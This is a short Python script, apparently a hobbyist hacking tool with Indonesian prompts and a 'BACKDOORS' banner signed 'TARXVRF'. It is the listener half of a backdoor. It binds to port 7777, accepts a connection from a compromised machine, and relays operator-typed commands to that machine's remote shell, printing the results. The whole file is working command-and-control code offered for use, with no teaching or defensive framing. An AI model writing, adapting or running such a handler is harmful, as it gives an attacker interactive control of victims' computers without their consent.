import socket
import os
import pyfiglet
sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
banner= pyfiglet.figlet_format('BACKDOORS')
print(banner)
print('Made By==[]====>TARXVRF<======[]==\n\n')
print(50*'=')
ip=input('masukkan ip anda ')

port=7777
sock.bind((ip,port))
print('menunggu koneksi ...')
sock.listen(1)
koneksi,target= sock.accept()

print(f'terhubung dengan {target[0]}')

def komunikasi():
    while True:
        perintah=input('tarxvrf>>> ')
        koneksi.send(perintah.encode('utf-8'))
        if perintah[:3] =='cd ': 
            pass           
        elif perintah == 'clear':
            os.system('clear')
        elif perintah in ('exit','quit'):
            sock.close()
            break        
        else:
            hasil=terima()
            print(str(hasil))
        
def terima():
    while True:
        try:   
            data=koneksi.recv(1024).decode('utf-8')   
            return data
        except ValueError:
            continue

komunikasi()
